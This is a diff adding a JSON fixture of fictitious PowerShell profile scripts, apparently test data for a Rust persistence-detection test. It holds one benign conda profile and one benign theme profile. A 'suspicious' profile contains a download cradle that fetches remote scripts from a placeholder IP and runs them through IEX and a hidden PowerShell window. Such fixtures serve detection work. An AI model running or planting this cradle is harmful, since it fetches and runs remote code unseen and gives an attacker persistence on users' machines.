@@ -1,0 +1,6 @@
+{
+  "comment": "Fictitious PowerShell profile scripts for tests/persistence.rs. Kept out of the test executable on purpose: the suspicious one looks like a download cradle.",
+  "suspicious_profile": "Set-Alias ll Get-ChildItem\n$w = New-Object Net.WebClient\nIEX ($w.DownloadString('http://203.0.113.5/p.ps1'))\nStart-Process powershell -WindowStyle Hidden -ArgumentList '-nop -w hidden -c Invoke-Expression (iwr http://203.0.113.5/s)'\n",
+  "conda_profile": "#region conda initialize\n# !! Contents within this block are managed by 'conda init' !!\nIf (Test-Path \"C:\\Users\\jdoe\\miniconda3\\Scripts\\conda.exe\") {\n    (& \"C:\\Users\\jdoe\\miniconda3\\Scripts\\conda.exe\" \"shell.powershell\" \"hook\") | Out-String | ?{$_} | Invoke-Expression\n}\n#endregion\n",
+  "theme_profile": "oh-my-posh init pwsh --config \"$env:POSH_THEMES_PATH\\jandedobbeleer.omp.json\" | Invoke-Expression\nImport-Module Terminal-Icons\nSet-PSReadLineOption -PredictionSource History\n"
+}
